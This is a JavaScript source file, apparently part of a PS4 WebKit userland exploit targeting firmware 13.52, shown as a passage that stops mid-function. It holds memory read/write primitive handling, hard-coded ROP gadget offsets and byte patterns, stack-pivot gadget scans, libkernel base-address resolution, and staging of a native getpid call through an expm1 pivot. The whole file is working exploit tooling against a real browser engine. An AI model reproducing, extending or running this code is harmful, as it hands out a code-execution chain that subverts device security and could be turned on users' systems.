import { int64 } from "./int64.js";
import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";
import { groomBootLine, wireGroomBar } from "./groom_presets.js";
import {
    PIVOT_HINTS_1300,
    PIVOT_HW_1352,
    pivotHint,
    pivotScanHint,
    PIVOT_ROWS,
    pivotPattern,
    verifyPivotSet,
    mergeScannedPivot,
    loadScannedPivot,
    saveScannedPivot,
    sanitizeScannedPivotStorage,
    G5_PATTERNS,
    checkG5Bytes,
    g5DerivedHint,
    G5_DELTA_FROM_G0,
    G5_EXPM1_DELTA,
    g5Expm1Hint,
    g5RvaSafe,
    webkitRvaMax,
    webkitRvaMaxFromOff,
    saveWebkitRvaProbe,
} from "./pivot_gadgets.js";
import {
    resolveLibkernel,
    scanLibkernelChunk,
    diagnoseWebkitDynamic,
    estimateLibkernelCandidates,
    showLibkernelGuesses,
    scanLibkernelLeakChunk,
    verifyManualLibkernelFromPtr,
    verifyManualLibkernelFromPtrLite,
    checkPrologueAt,
    saveLibkernelSession,
    loadForcedLibkernel,
    isGetpidStub as lkIsGetpidStub,
    verifyManualLibkernel,
    tryPsfreePltBatch,
    resolveLibkernelPsfree,
    formatPsfreeStats,
    resolveLibkernelFindChunk,
    resolveLibkernelRelroChunk,
    verifyLibkernelBase,
    extPtrToLkCandidates,
    plausibleHeapCell,
    resolveExtPtrSafe,
    resolveExtListVote,
    resolveMinExtDeepWalk,
    tryWebkitNearLibkernel,
    resolveExtAlignedKError,
} from "./libkernel_resolve.js";
import { createCrashLog } from "./log_persist.js";
import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";

const params = new URLSearchParams(location.search);
const BUILD_ID = "rw-20250831q";
/** opt-in only — release triggers JSC GC */
const PROMOTE_PAIR = params.get("promote") === "1";
const SCAN_PIVOT_MIN = 0x10000;
/** Scan low .text first — MOV @ +0x1f9bb; 13.00 hints @ +0x295f… are wrong on 13.52 */
/** Scan low .text — G0-G4 live below ~0xe3e4a on 13.52 */
const SCAN_LOW_MAX = parseInt(params.get("scanlowmax") || "800000", 16);
const SCAN_CLUSTER_PAD = parseInt(params.get("scanclusterpad") || "40000", 16);
const SCAN_PIVOT_MAX = parseInt(params.get("scanmax") || "4800000", 16);
const SCAN_NEAR_RADIUS = parseInt(params.get("scanrad") || "8000", 16);
/** Bounded steps per auto-loop tick — yields + GC between chunks */
const SCAN_CHUNK_STEPS = parseInt(params.get("scanchunk") || "2048", 10);
/** HW G5 @ +0x13ec77a (expm1 + 0x53642a) */
const G5_HUNT_CENTER = parseInt(params.get("g5center") || "13ec77a", 16);
const G5_HUNT_RADIUS = parseInt(params.get("g5rad") || "80000", 16);
/** Legacy 13.00 high G5 — blocked on 13.52 (unmapped, OOM on read) */
const G5_LEGACY_RVAS = [
    [0x2abccaa, "13.00"],
    [0x2abb0ba, "12.50"],
    [0x2abb03a, "12.00"],
];
/** G5 full low scan is opt-in (OOM risk) */
let scanG5Full = params.get("g5full") === "1";
let g5Hunt = null;
/** cal-style fast scan: read8 + 8-byte step, yield every 256 reads (like scanGadgetChunk) */
const SCAN_YIELD_EVERY = parseInt(params.get("scanyield") || "256", 10);
const SCAN_G5_CAND_MAX = 24;
const ELF_MAGIC = 0x464c457f;
const SYS_GETPID = 20;
const HW_GADGETS_1352 = {
    wk_POP_RDI_RET: 0x4be55,
    wk_POP_RSI_RET: 0x7acb3,
    wk_POP_RDX_RET: 0x30b1e9,
    wk_POP_RCX_RET: 0xeaf246,
    wk_POP_RAX_RET: 0x3424a,
    wk_POP_R8_RET:  0x5d185,
    wk_POP_R9_RET:  0x9b288b,
    wk_LEAVE_RET:   0xf195b,
    wk_expm1_builtin: 0xeb6350,
};

const lines = [];
const retained = [];
const pointers = [];
let busy = false;
let ready = false;
let exploit = null;
let raceAttempt = 0;
let lengthMissStreak = 0;

const LOG_MAX = 300;
const crashLog = createCrashLog({
    ssLog: "wk-rw-log",
    ssState: "wk-rw-state",
    ssBuild: "wk-rw-log-build",
    buildId: BUILD_ID,
    maxLines: 200,
});
const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|HINT-GROOM/i;

let raceMode = false;
const raceBuf = [];

let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
let btnStart, btnSaveBases, btnRwProof, btnNative, btnLoadCal, btnForceLk, btnGuessLk;
let btnPsfreeLite, btnPsfreeLk, btnPsfreeStop, btnPeek, btnClear;
let btnVerifyPivot, btnScanPivot;
let gadgetBtns = [];
let g5BarBtns = [];
let nativeChain = null;
let nativePrep = null;
let nativeStaged = false;
let nativeAllowed = false;
let pivotReady = false;
let pivotScan = null;
let scanPivotAuto = false;
let scanPivotStop = false;
let scanQuiet = false;
let scanRenderPending = 0;
let lkQuiet = false;
let nativeQuiet = false;
const SCAN_MARK_TAGS = /^(SCAN-|G5-|PIVOT-|LK-|NATIVE-)/;
const _scanBytes = new Array(8);
const _win16 = new Array(16);

function $(id) { return document.getElementById(id); }

function renderOut() {
    if (!outEl) return;
    outEl.textContent = lines.join("\n");
    outEl.scrollTop = outEl.scrollHeight;
}

function clearPersistedLog() {
    crashLog.clear();
}

function mark(tag, detail) {
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    if (lkQuiet) {
        if (/^LK-(OK|FAIL|SKIP|CAL|HINT|CAL-MISS|CAL-DONE|GUESS|PSFREE|GOT|FIND|TRACE|MISS|EXT|CELL|FINISH|VERIFY|VOTE|MIN-WALK|RESOLVE)/.test(tag)) {
            lines.push(line);
            if (lines.length > 40) lines.splice(0, lines.length - 40);
            renderOut();
        }
        return;
    }
    if (nativeQuiet) {
        if (/^NATIVE-|^PIVOT-|^BASES|^STUBS|^ERROR/.test(tag)) {
            lines.push(line);
            if (lines.length > 24) lines.splice(0, lines.length - 24);
        }
        return;
    }
    const raceCritical = /FAIL|ERROR|GIVE-UP|READ-PRIMITIVE|TRIM|ATTEMPT-START|PRIMITIVE/i.test(tag);
    if (raceMode) {
        raceBuf.push(line);
        if (raceBuf.length > 64) raceBuf.shift();
        crashLog.append(line, tag);
        if (raceCritical) {
            lines.push(line);
            if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
            if (outEl) {
                outEl.textContent = lines.join("\n");
                outEl.scrollTop = outEl.scrollHeight;
            }
        }
        return;
    }
    lines.push(line);
    if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
    crashLog.append(line, tag);
    if (scanQuiet && !SCAN_MARK_TAGS.test(tag)) {
        scanRenderPending++;
        if (scanRenderPending >= 48) {
            scanRenderPending = 0;
            renderOut();
        }
        return;
    }
    scanRenderPending = 0;
    renderOut();
}

function state(msg, cls) {
    if (!stateEl) return;
    stateEl.textContent = msg;
    stateEl.className = cls || "";
    if (!raceMode || /OK|FAIL|error|native|primitive|promote|broken/i.test(msg || ""))
        crashLog.persistState(msg, cls);
}

function setUi() {
    if (btnStart) btnStart.disabled = busy || ready;
    if (btnSaveBases) btnSaveBases.disabled = busy || !ready;
    if (btnRwProof) btnRwProof.disabled = busy || !ready;
    if (btnVerifyPivot) btnVerifyPivot.disabled = busy || !ready;
    if (btnScanPivot) {
        btnScanPivot.disabled = !ready || (busy && !scanPivotAuto);
        btnScanPivot.textContent = scanPivotAuto ? "Stop scan" : "Scan pivot (auto)";
    }
    if (btnNative) {
        btnNative.disabled = busy || !ready || !nativeAllowed;
        if (nativeStaged) {
            btnNative.textContent = "Fire getpid";
            btnNative.title = "expm1 pivot — zero alloc, one tap";
        } else {
            btnNative.textContent = "Arm getpid";
            btnNative.title = "Force lk auto-arms — or tap Arm, then Fire";
        }
    }
    if (btnLoadCal) btnLoadCal.disabled = busy || !ready;
    if (btnForceLk) btnForceLk.disabled = busy || !ready;
    if (btnGuessLk) btnGuessLk.disabled = busy || !ready;
    if (btnPsfreeLite) {
        btnPsfreeLite.disabled = !ready || (busy && !findLkAuto);
        btnPsfreeLite.textContent = "Scan GOT lite";
    }
    if (btnPsfreeLk) {
        btnPsfreeLk.disabled = !ready || (busy && !findLkAuto);
        btnPsfreeLk.textContent = "Scan GOT";
    }
    if (btnPsfreeStop) {
        btnPsfreeStop.disabled = !findLkAuto && !psfreeAutoScan;
        btnPsfreeStop.textContent = "Stop find";
    }
    if (btnPeek) btnPeek.disabled = busy || !ready;
    if (pickPtr) pickPtr.disabled = busy || !ready;
    if (addrIn) addrIn.disabled = busy || !ready;
    for (let i = 0; i < gadgetBtns.length; i++)
        gadgetBtns[i].disabled = busy || !ready;
    for (let i = 0; i < g5BarBtns.length; i++)
        g5BarBtns[i].disabled = busy || !ready;
    const btnClearPivot = $("btn-clear-pivot");
    if (btnClearPivot) btnClearPivot.disabled = busy;
    const btnRestorePivot = $("btn-restore-pivot");
    if (btnRestorePivot) btnRestorePivot.disabled = busy;
}

function updatePivotReady(p, off) {
    const { webkitBase } = basesFromSession(off);
    if (!p || !webkitBase) {
        pivotReady = false;
        return null;
    }
    const v = verifyPivotSet(addr => read1p(p, addr), webkitBase, off);
    pivotReady = v.ok;
    return v;
}

function parseAddr(str) {
    if (!str) return null;
    const s = String(str).trim().toLowerCase().replace(/^0x/, "");
    if (!/^[0-9a-f]+$/.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16), 0);
    return new int64(parseInt(s.slice(-8), 16), parseInt(s.slice(0, -8), 16));
}

/** PS4 module bases are 16KB-aligned. */
function alignModuleBase(addr) {
    if (!addr) return null;
    return new int64(addr.low & ~0x3fff, addr.hi);
}

/** cal EXT-PTR: c.ptr = code pointer, c.code = prologue magic (NOT subtract for base). */
function lkBaseFromCalEntry(c) {
    const codePtr = parseAddr(c.ptr);
    if (!codePtr) return null;
    return alignModuleBase(codePtr);
}

function buildCalLkCandidates(p, off, webkitBase) {
    const out = [];
    const seen = new Set();
    function push(entry) {
        const k = String(entry.base);
        if (seen.has(k)) return;
        seen.add(k);
        out.push(entry);
    }
    const entries = calExtPtrCandidates();
    for (let i = 0; i < entries.length; i++) {
        const c = entries[i];
        const codePtr = parseAddr(c.ptr);
        if (!codePtr) continue;
        if (p && off && webkitBase) {
            const bases = extPtrToLkCandidates(p, codePtr, off, webkitBase);
            for (let b = 0; b < bases.length; b++) {
                push({
                    label: c.label + " (" + (b === 0 ? "page" : "kerr") + ")",
                    code: c.ptr,
                    magic: c.code,
                    base: bases[b],
                    note: b === 0 ? "ext-ptr" : "error-rva",
                });
            }
        } else {
            const base = lkBaseFromCalEntry(c);
            if (base) {
                push({
                    label: c.label,
                    code: c.ptr,
                    magic: c.code,
                    base,
                    note: "align4k",
                });
                push({
                    label: c.label + " −4K",
                    code: c.ptr,
                    magic: c.code,
                    base: base.sub32(0x4000),
                    note: "align4k-4k",
                });
            }
        }
    }
    return out;
}

function validateLkBase(lk) {
    if (!lk) return "missing libkernel base";
    if (lk.hi === 0) return "base hi=0 — need full 64-bit ptr";
    if ((lk.low & 0x3fff) !== 0)
        return "not 16KB-aligned — Load cal ptr (computes base) or paste module base not code ptr";
    return null;
}

function fmtHex32(v) {
    if (v == null) return "null";
    return "0x" + (v >>> 0).toString(16);
}

function fmtBytes(arr) {
    return arr.map(b => (b & 0xff).toString(16).padStart(2, "0")).join(" ");
}

/** Bases from sessionStorage only — no leakval (OOM-safe). */
function basesFromSession(off) {
    const nativeFn = parseAddr(sessionStorage.getItem("wk-nativeFn"));
    let webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
    let derived = null;
    if (nativeFn && off.wk_expm1_builtin)
        derived = nativeFn.sub32(off.wk_expm1_builtin);
    if (derived) {
        if (!webkitBase || !same64(webkitBase, derived)) {
            if (webkitBase && nativeFn)
                mark("BASE-FIX", "webkitBase stale cached — using nativeFn-expm1");
            webkitBase = derived;
        }
    }
    let libkernelBase = parseAddr(sessionStorage.getItem("wk-libkernelBase"));
    return { nativeFn, webkitBase, libkernelBase };
}

function checkPat(p, base, rva, pat) {
    if (rva == null || !base) return { ok: false, detail: "no base/rva" };
    const addr = base.add32(rva);
    const got = [];
    for (let i = 0; i < pat.length; i++) {
        if (pat[i] === null) continue;
        const b = read1p(p, addr.add32(i));
        if (b == null) return { ok: false, detail: "read-fail @+" + rva.toString(16) };
        got.push(b & 0xff);
        if ((b & 0xff) !== pat[i])
            return {
                ok: false,
                detail: "+0x" + rva.toString(16) + " got=" + fmtBytes(got)
                    + " want=" + fmtBytes(pat.filter(x => x != null)),
            };
    }
    return { ok: true, detail: "+0x" + rva.toString(16) + " " + fmtBytes(got) };
}

function isGetpidStub(v) {
    return lkIsGetpidStub(v);
}

/** cal 2e EXT-PTR (13.52 HW — skip vtable[1,3,4,5,9] webkit 0xe5894855). */
function pairCellsForLk() {
    const out = [];
    const fields = [
        ["mainAddress", "pair.main"],
        ["workerAddress", "pair.worker"],
        ["fakeAddress", "pair.fake"],
        ["mainCellFromFakeSlot", "pair.mainSlot"],
    ];
    for (let i = 0; i < fields.length; i++) {
        const v = pairStatus[fields[i][0]];
        if (v == null || v === -1) continue;
        if (!plausibleHeapCell(v)) continue;
        out.push({ label: fields[i][1], cell: v });
    }
    return out;
}

function saveTextareaSession(p, carrier) {
    if (!carrier) return;
    try {
        if (carrier.textareaAddress > 0 && Number.isFinite(carrier.textareaAddress))
            sessionStorage.setItem("wk-textareaAddr", carrier.textareaAddress.toString(16));
    } catch (_) { }
    try {
        if (carrier.textarea && p)
            sessionStorage.setItem("wk-textareaCell", String(p.leakval(carrier.textarea)));
    } catch (_) { }
}

function knownExtPtrsForLk() {
    const out = [];
    const seen = new Set();
    for (let i = 0; i < CAL_VTABLE_PTRS.length; i++) {
        const p = CAL_VTABLE_PTRS[i].ptr.toLowerCase();
        if (!seen.has(p)) { seen.add(p); out.push(CAL_VTABLE_PTRS[i].ptr); }
    }
    try {
        const extra = sessionStorage.getItem(SS_CAL_EXT_PTRS);
        if (extra) {
            const arr = JSON.parse(extra);
            if (Array.isArray(arr)) {
                for (let j = 0; j < arr.length; j++) {
                    const raw = (arr[j].ptr || arr[j].hex || "").replace(/^0x/i, "").toLowerCase();
                    if (raw && !seen.has(raw)) { seen.add(raw); out.push(raw); }
                }
            }
        }
    } catch (_) { }
    return out;
}

const CAL_VTABLE_PTRS = [
    { label: "vtable[0]", ptr: "83ed11770", code: "0x45b8" },
    { label: "vtable[2]", ptr: "83d49dce0", code: "0x90c3c031" },
    { label: "vtable[6]", ptr: "83dc68320", code: "0xf9dd6be9" },
    { label: "vtable[7]", ptr: "83e21dc30", code: "0x909090c3" },
    { label: "vtable[8]", ptr: "83f35f410", code: "0x7e938be9" },
    { label: "vtable[10]", ptr: "83e153870", code: "0x909090c3" },
    { label: "vtable[11]", ptr: "83f34c110", code: "0x2184783" },
];
const SS_CAL_EXT_PTRS = "wk-cal-ext-ptrs";
let calPtrIdx = 0;
let guessLkIdx = 0;
let calLkCands = null;
let psfreePltState = null;
let psfreeAutoScan = false;
let psfreeAutoStop = false;
let psfreePreset = null;

const PSFREE_LITE = { maxReads: 12, yieldBatches: 1, cluster: true, label: "lite" };
const PSFREE_NORM = { maxReads: 20, yieldBatches: 1, cluster: true, label: "norm" };

let findLkState = null;
let findLkAuto = false;
let findLkStop = false;
let findLkPreset = null;

const FIND_LK_LITE = {
    label: "lite",
    lite: true,
    safeOnly: true,
    collectOnly: true,
    deferResolve: true,
    maxWalkPages: 0,
    knownMax: 0,
    knownWalkPages: 0,
    knownBatch: 1,
    vtableEntries: 8,
    vtBatch: 1,
    minWalkPages: 128,
    walkPages: 64,
    cellMax: 2,
};
const FIND_LK_NORM = {
    label: "norm",
    lite: false,
    safeOnly: true,
    collectOnly: true,
    deferResolve: true,
    maxWalkPages: 0,
    knownMax: 0,
    knownWalkPages: 0,
    knownBatch: 1,
    vtableEntries: 12,
    vtBatch: 1,
    minWalkPages: 160,
    walkPages: 64,
    cellMax: 3,
};

function parseCalPtr(raw) {
    const s = String(raw).replace(/^0x/i, "").trim();
    if (!s) return null;
    const n = BigInt("0x" + s);
    return new int64(Number(n & 0xffffffffn), Number((n >> 32n) & 0xffffffffn));
}

function calExtPtrCandidates() {
    const out = CAL_VTABLE_PTRS.slice();
    try {
        const raw = sessionStorage.getItem(SS_CAL_EXT_PTRS);
        if (!raw) return out;
        const extra = JSON.parse(raw);
        if (!Array.isArray(extra)) return out;
        const seen = new Set(out.map(e => e.ptr.toLowerCase()));
        for (let i = 0; i < extra.length; i++) {
            const e = extra[i];
            const ptr = (e.ptr || e.hex || "").replace(/^0x/i, "").toLowerCase();
            if (!ptr || seen.has(ptr)) continue;
            if (e.code === "0xe5894855" || e.code === "e5894855") continue;
            seen.add(ptr);
            out.push({ label: e.label || "cal", ptr, code: e.code || "?" });
        }
    } catch (_) { }
    return out;
}

/** Manual tests — one button = minimal reads, one log line. */
const MANUAL_TESTS = [
    { id: "elf", group: "base", label: "ELF @ base" },
    { id: "native", group: "base", label: "nativeFn code" },
    { id: "scan-iat", group: "base", label: "Scan libkernel" },
    { id: "leak-lk", group: "base", label: "Leak+vtable LK" },
    { id: "try-cal-ptrs", group: "base", label: "Load cal ptr" },
    { id: "verify-lk", group: "base", label: "Verify lk" },
    { id: "show-lk", group: "base", label: "Show LK hints" },
    { id: "force-lk", group: "base", label: "Force lk" },
    { id: "paste-lk", group: "base", label: "Paste lk (1 peek)" },
    { id: "libkernel", group: "base", label: "libkernel" },
    { id: "stub20", group: "base", label: "getpid stub" },
    { id: "pop_rdi", group: "pop", label: "POP RDI", key: "wk_POP_RDI_RET", pat: [0x5f, 0xc3] },
    { id: "pop_rsi", group: "pop", label: "POP RSI", key: "wk_POP_RSI_RET", pat: [0x5e, 0xc3] },
    { id: "pop_rdx", group: "pop", label: "POP RDX", key: "wk_POP_RDX_RET", pat: [0x5a, 0xc3] },
    { id: "pop_rcx", group: "pop", label: "POP RCX", key: "wk_POP_RCX_RET", pat: [0x59, 0xc3] },
    { id: "pop_rax", group: "pop", label: "POP RAX", key: "wk_POP_RAX_RET", pat: [0x58, 0xc3] },
    { id: "pop_r8", group: "pop", label: "POP R8", key: "wk_POP_R8_RET", pat: [null, 0x58, 0xc3] },
    { id: "pop_r9", group: "pop", label: "POP R9", key: "wk_POP_R9_RET", pat: [null, 0x59, 0xc3] },
    { id: "leave", group: "pop", label: "LEAVE", key: "wk_LEAVE_RET", pat: [0xc9, 0xc3] },
    { id: "mov_rdi_rax", group: "pivot", label: "MOV [rdi],rax", key: "wk_MOV_QWORD_PTR_RDI_RAX_RET", pat: [0x48, 0x89, 0x07, 0xc3] },
    { id: "g0", group: "pivot", label: "G0", key: "wk_MOV_RDI_RSI_30_CALL", pat: [0x48, 0x8b, 0x7e, 0x30] },
    { id: "g1", group: "pivot", label: "G1", key: "wk_POP_RAX_MOV_RAX_JMP_18", pat: [0x58, 0x48, 0x8b, 0x07] },
    { id: "g2", group: "pivot", label: "G2", key: "wk_PUSH_RBP_MOV_RBP_RSP_10", pat: [0x55, 0x48, 0x89, 0xe5] },
    { id: "g3", group: "pivot", label: "G3", key: "wk_MOV_RDI_RAX_8_CALL_20", pat: [0x48, 0x8b, 0x78, 0x08] },
    { id: "g4", group: "pivot", label: "G4", key: "wk_MOV_RDX_RAX_18_CALL_10", pat: [0x48, 0x8b, 0x50, 0x38], spKey: true },
    { id: "g5", group: "pivot", label: "G5 probe", key: "wk_PUSH_RDX_POP_RSP_RET", pat: [0x52, 0x5c, 0xc3] },
];

function runManualTest(testId) {
    if (!ready || !window.p || busy) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { nativeFn, webkitBase, libkernelBase } = basesFromSession(off);
    const test = MANUAL_TESTS.find(t => t.id === testId);
    if (!test) return;

    if (test.group === "base") {
        if (testId === "elf") {
            if (!webkitBase) {
                mark("GADGET-SKIP", "ELF — no webkitBase (Save bases or cal Accept)");
                return;
            }
            const magic = read4p(p, webkitBase);
            if (magic === ELF_MAGIC)
                mark("GADGET-OK", "ELF magic @ " + webkitBase);
            else if (off.wk_POP_RDI_RET != null) {
                const g = checkPat(p, webkitBase, off.wk_POP_RDI_RET, [0x5f, 0xc3]);
                mark(g.ok ? "GADGET-OK" : "GADGET-BAD",
                    "ELF miss peek=" + fmtHex32(magic) + " but POP_RDI " + g.detail);
            } else {
                mark("GADGET-BAD", "ELF @ " + webkitBase + " peek=" + fmtHex32(magic));
            }
            return;
        }
        if (testId === "native") {
            if (!nativeFn) {
                mark("GADGET-SKIP", "nativeFn — tap Save bases or cal Accept");
                return;
            }
            const q0 = read4p(p, nativeFn);
            if (q0 == null || q0 === 0 || q0 === 0xffffffff || q0 === 0xcccccccc)
                mark("GADGET-BAD", "nativeFn @ " + nativeFn + " code0=" + fmtHex32(q0));
            else
                mark("GADGET-OK", "nativeFn @ " + nativeFn + " code0=" + fmtHex32(q0));
            return;
        }
        if (testId === "libkernel") {
            if (!webkitBase) {
                mark("GADGET-SKIP", "libkernel — no webkitBase");
                return;
            }
            const r = resolveLibkernel(p, webkitBase, off, {
                log: mark,
                read8: read8p,
            });
            if (r.ok)
                mark("GADGET-OK", "libkernel " + r.lk + " (" + r.source + ")");
            else
                mark("GADGET-BAD", r.error || "libkernel resolve failed");
            return;
        }
        if (testId === "paste-lk") {
            const raw = addrIn && addrIn.value ? addrIn.value.trim() : "";
            const lk = parseAddr(raw.replace(/^0x/i, ""));
            if (!lk) {
                mark("LK-SKIP", "enter libkernel base in hex box, then Paste (1 peek) or Force lk (0 reads)");
                return;
            }
            lkQuiet = true;
            let w = null;
            try {
                w = read4p(p, lk);
            } catch (_) { }
            lkQuiet = false;
            if (w != null) {
                saveLibkernelSession(lk, null, { forced: true });
                mark("LK-OK", "peek " + fmtHex32(w) + " @ " + lk + " — saved unverified");
                state("libkernel saved (1 peek)", "ok");
            } else {
                mark("LK-FAIL", "read failed @ " + lk + " — use Force lk if base from cal");
                state("peek failed — Force lk?", "bad");
            }
            renderOut();
            crashLog.append("LK-OK pasted " + lk, "LK-OK");
            crashLog.flushSync();
            return;
        }
        if (testId === "force-lk") {
            const raw = addrIn && addrIn.value ? addrIn.value.trim() : "";
            const lk = parseAddr(raw.replace(/^0x/i, ""));
            if (!lk) {
                mark("LK-SKIP", "enter libkernel base hex, then Force lk (0 reads)");
                return;
            }
            runForceLkOnly(lk);
            return;
        }
        if (testId === "scan-iat") {
            runScanIat().catch(function (err) {
                mark("LK-FAIL", err.message || String(err));
                busy = false;
                setUi();
                renderOut();
            });
            return;
        }
        if (testId === "probe-lk" || testId === "show-lk") {
            runShowLkHints();
            return;
        }
        if (testId === "leak-lk") {
            runLeakLkScan().catch(function (err) {
                mark("LK-FAIL", err.message || String(err));
                busy = false;
                setUi();
                renderOut();
            });
            return;
        }
        if (testId === "try-cal-ptrs") {
            runTryCalPtrs();
            return;
        }
        if (testId === "verify-lk") {
            runVerifyLk();
            return;
        }
        if (testId === "stub20") {
            let lk = libkernelBase;
            if (!lk && webkitBase) {
                const r = resolveLibkernel(p, webkitBase, off, { log: mark, read8: read8p });
                if (r.ok) lk = r.lk;
            }
            if (!lk) {
                mark("GADGET-SKIP", "getpid stub — run libkernel test first");
                return;
            }
            const o = off.k_stubs && off.k_stubs[SYS_GETPID];
            if (o == null) {
                mark("GADGET-SKIP", "no k_stubs[20] offset");
                return;
            }
            const v = read8p(p, lk.add32(o));
            if (isGetpidStub(v))
                mark("GADGET-OK", "getpid stub @ lk+" + o.toString(16));
            else
                mark("GADGET-BAD", "stub @+" + o.toString(16) + " read8=" + (v ? String(v) : "null"));
            return;
        }
    }

    if (!webkitBase) {
        mark("GADGET-SKIP", test.label + " — no webkitBase (Save bases or cal Accept)");
        return;
    }
    let rva = off[test.key];
    let pat = test.pat;
    if (test.spKey && off.pivot_view_sp != null)
        pat = [0x48, 0x8b, 0x50, off.pivot_view_sp & 0xff];
    if (rva == null && test.group === "pivot") {
        if (testId === "g5") {
            runG5ClusterProbe();
            return;
        }
        const hint = pivotHint(test.key);
        if (hint > 0 && g5RvaSafe(hint, off)) {
            const g = checkPat(p, webkitBase, hint, pat);
            mark(g.ok ? "GADGET-OK" : "GADGET-BAD",
                test.label + " hint +0x" + hint.toString(16) + " " + g.detail);
        } else {
            mark("GADGET-SKIP", test.label + " — no safe low RVA (never reads 13.00 high hint)");
        }
        updatePivotReady(p, off);
        setUi();
        return;
    }
    if (testId === "g5" && rva != null) {
        const g5 = checkG5Bytes((a) => read1p(p, a), webkitBase, rva);
        mark(g5 ? "GADGET-OK" : "GADGET-BAD",
            test.label + " +0x" + rva.toString(16)
                + (g5 ? " " + g5.kind : " — not a rdx→rsp pivot"));
        updatePivotReady(p, off);
        setUi();
        return;
    }
    const g = checkPat(p, webkitBase, rva, pat);
    mark(g.ok ? "GADGET-OK" : "GADGET-BAD", test.label + " " + g.detail);
    if (test.group === "pivot") {
        updatePivotReady(p, off);
        setUi();
    }
}

function saveBasesManual() {
    if (!ready || !window.p || busy) return;
    busy = true;
    setUi();
    try {
        const p = window.p;
        const off = loadEffectiveOff();
        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function || 0x28));
        if (!nativeFn) {
            mark("SAVE-FAIL", "nativeFn capture failed");
            return;
        }
        try { sessionStorage.setItem("wk-nativeFn", String(nativeFn)); } catch (_) { }
        const webkitBase = (nativeFn && off.wk_expm1_builtin)
            ? nativeFn.sub32(off.wk_expm1_builtin)
            : resolveWebkitBase(off, nativeFn);
        if (webkitBase) {
            try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
            mark("SAVE-OK", "nativeFn=" + nativeFn + " webkitBase=" + webkitBase);
            mark("SAVE-HINT", "optional — Force lk → Fire getpid");
        } else {
            mark("SAVE-OK", "nativeFn=" + nativeFn + " (no expm1 for base)");
        }
        state("bases saved — tap gadget buttons", "ok");
    } finally {
        busy = false;
        setUi();
    }
}

function gadgetBytesHex(p, base, rva, n) {
    const out = [];
    for (let i = 0; i < n; i++) {
        const b = read1p(p, base.add32(rva + i));
        out.push(b == null ? "??" : (b & 0xff).toString(16).padStart(2, "0"));
    }
    return out.join(" ");
}

function pivotRowByLabel(label) {
    const base = label.split(" ")[0];
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        if (PIVOT_ROWS[i][0] === base) return PIVOT_ROWS[i];
    }
    return null;
}

function logPivotBadBytes(p, webkitBase, off, labels) {
    for (let i = 0; i < labels.length; i++) {
        const lab = labels[i].split(" ")[0];
        const row = pivotRowByLabel(lab);
        if (!row) continue;
        const rva = off[row[1]];
        if (rva == null) continue;
        const pat = pivotPattern(row, off);
        const n = lab === "G5" ? 6 : Math.max(pat.length, 4);
        mark("PIVOT-HEX", lab + " +0x" + rva.toString(16)
            + " got " + gadgetBytesHex(p, webkitBase, rva, n)
            + (lab === "G5" ? " (want 52 5c c3 or 48 89 d4 c3)" : ""));
    }
}

function pivotNotReadyMsg(v) {
    const parts = [];
    if (v.missing.length) parts.push("missing " + v.missing.join(", "));
    if (v.bad.length) parts.push("bad " + v.bad.join(", "));
    return parts.length ? parts.join("; ") : "?";
}

function applyG5Rva(rva) {
    const { webkitBase } = basesFromSession(loadEffectiveOff());
    saveScannedPivot(webkitBase, { wk_PUSH_RDX_POP_RSP_RET: rva });
    mark("G5-SET", "+0x" + rva.toString(16) + " saved — verifying…");
    if (ready && window.p && webkitBase) {
        verifyPivotManual();
    } else if (!webkitBase) {
        mark("G5-HINT", "Save bases then tap Verify pivot");
    }
    setUi();
}

function clearPivotState() {
    try {
        sessionStorage.removeItem("wk-pivot-scan-state");
        sessionStorage.removeItem("wk-scanned-pivot");
        sessionStorage.removeItem("wk-scanned-pivot-base");
    } catch (_) { }
    sanitizeScannedPivotStorage();
    pivotScan = null;
    pivotReady = false;
    mark("PIVOT-CLEAR", "G5 + scan state cleared — G0-G4 restored to HW table");
    setUi();
}

function restoreHwPivot() {
    sanitizeScannedPivotStorage();
    try {
        sessionStorage.removeItem("wk-pivot-scan-state");
    } catch (_) { }
    pivotScan = null;
    mark("PIVOT-RESTORE", "G0-G4 HW RVAs restored — only G5 from session if set");
    if (ready && window.p) verifyPivotManual();
    else setUi();
}

function pickBestG5Cand(cands, center) {
    if (!cands.length) return null;
    const rdx = cands.filter(c => /rdx/i.test(c.kind));
    const pool = rdx.length ? rdx : cands;
    pool.sort((a, b) => Math.abs(a.rva - center) - Math.abs(b.rva - center));
    return pool[0];
}

function scanG5PatternsAt(p, webkitBase, rva, cands, center) {
    if (!fillWindow16(p, webkitBase, rva, _win16)) return;
    for (let pi = 0; pi < G5_PATTERNS.length; pi++) {
        const pat = G5_PATTERNS[pi].pat;
        for (let start = 0; start <= 16 - pat.length; start++) {
            if (!matchPatAt(_win16, start, pat)) continue;
            g5CandPush(cands, { rva: rva + start, kind: G5_PATTERNS[pi].kind }, center);
        }
    }
    for (let start = 0; start <= 12; start++) {
        if (_win16[start + 1] === 0x52 && _win16[start + 2] === 0x5c && _win16[start + 3] === 0xc3
            && _win16[start] >= 0x40 && _win16[start] <= 0x4f) {
            g5CandPush(cands, {
                rva: rva + start,
                kind: "rex push rdx; pop rsp; ret",
            }, center);
        }
    }
}

function scanCapOff() {
    return webkitRvaMax(loadEffectiveOff());
}

function guardG5Rva(rva, tag) {
    const off = loadEffectiveOff();
    const cap = webkitRvaMax(off);
    if (!g5RvaSafe(rva, off)) {
